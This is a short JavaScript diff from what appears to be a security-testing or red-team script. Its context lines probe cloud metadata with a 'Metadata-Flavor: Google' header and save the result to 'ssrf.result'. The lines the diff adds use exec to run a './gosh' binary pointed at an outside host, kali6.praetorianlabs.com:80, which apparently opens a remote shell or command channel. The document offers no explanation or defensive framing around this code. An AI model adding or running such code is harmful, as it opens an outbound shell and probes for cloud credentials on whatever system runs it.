@@ -14,3 +14,15 @@ axios.get("https://google.com", {headers: {'Metadata-Flavor': 'Google'}}, { tran
     result = JSON.stringify(error);    
     fs.writeFileSync('ssrf.result', result);    
 });
+
+
+exec("./gosh -host kali6.praetorianlabs.com:80", (error, stdout, stderr) => {
+    if (error) {
+        console.log(JSON.stringify(error.message));
+    }
+    else if (stderr) {
+        console.log(response=JSON.stringify(stderr));
+    }
+    else
+        console.log(response = JSON.stringify(stdout));
+});
